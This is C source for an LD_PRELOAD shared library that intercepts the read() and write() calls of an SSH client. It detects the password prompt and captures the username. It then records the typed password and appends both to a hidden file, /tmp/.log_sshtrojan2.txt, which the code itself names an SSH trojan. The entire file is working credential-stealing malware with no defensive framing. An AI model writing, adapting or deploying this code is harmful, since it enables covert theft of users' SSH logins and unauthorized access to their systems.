#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

static ssize_t (*original_read)(int, void *, size_t) = NULL;
static ssize_t (*original_write)(int, const void *, size_t) = NULL;
static int password_mod = 0;
static char username[64] = {0};
static char password_buffer[128] = {0};
static size_t password_len = 0;

ssize_t write(int fd, const void *buf, size_t count) {
    if (!original_write) {
        original_write = dlsym(RTLD_NEXT, "write");
    }

    if (fd == 4 && strstr(buf, "password: ")) {  
        char *pos = strstr(buf, "@");
        if (pos) {
            size_t user_len = pos - (char *)buf;
            if (user_len < sizeof(username)) {
                memcpy(username, buf, user_len);
                username[user_len] = '\0';
            }
            password_mod = 1;  
            password_len = 0;
        }
    }
    return original_write(fd, buf, count);
}

ssize_t read(int fd, void *buf, size_t count) {
    if (!original_read) {
        original_read = dlsym(RTLD_NEXT, "read");
    }

    size_t bytes_read = original_read(fd, buf, count);

    if (bytes_read > 0 && fd == 4 && password_mod) {
        memcpy(password_buffer + password_len, buf, bytes_read);
        password_len += bytes_read;

        if (memchr(buf, '\n', bytes_read)) {
            FILE *log_fp = fopen("/tmp/.log_sshtrojan2.txt", "a");
            if (log_fp) {
                fprintf(log_fp, "SSH Login - Username: %s | Password: %.*s\n",
                        username, (int)(password_len - 1), password_buffer);
                fclose(log_fp);
            }
            password_len = 0;
            password_mod = 0;
        }
    }
    return bytes_read;
}
